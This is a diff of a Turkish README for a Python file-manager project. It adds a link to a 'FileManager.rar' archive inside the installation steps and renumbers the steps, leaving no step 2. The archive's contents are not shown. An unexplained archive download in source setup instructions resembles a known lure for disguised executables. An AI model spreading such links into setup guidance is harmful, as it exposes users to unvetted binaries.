@@ -3,12 +3,13 @@ Dosya yönetim sistemi
 ## Kurulum
 1. Repository'yi klonlayın:
   cd FileManager
+  https://github.com/tayfuntemur/File-Manager/blob/main/FileManager.rar
 
-2. Sanal ortam oluşturun ve aktifleştirin:
+3. Sanal ortam oluşturun ve aktifleştirin:
   python -m venv .venv
   .venv\Scripts\activate  # Windows için
   source .venv/bin/activate  # Linux/Mac için
-3. Bağımlılıkları yükleyin:
+4. Bağımlılıkları yükleyin:
    pip install -r requirements.txt
 
 ## Çalıştırma
